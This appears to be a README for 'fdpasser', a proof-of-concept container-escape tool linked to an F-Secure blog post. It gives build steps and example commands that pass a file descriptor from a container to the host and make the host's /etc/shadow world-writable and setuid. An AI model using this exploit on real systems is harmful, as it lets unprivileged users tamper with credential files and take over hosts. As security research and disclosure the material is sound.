# What is this?
Read the F-Secure Blog: (TODO)

# Build
```
make
```

# Example
```
In container, as root: ./fdpasser recv /moo /etc/shadow
Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
Outside container: ls -la /etc/shadow
Output: -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow
```
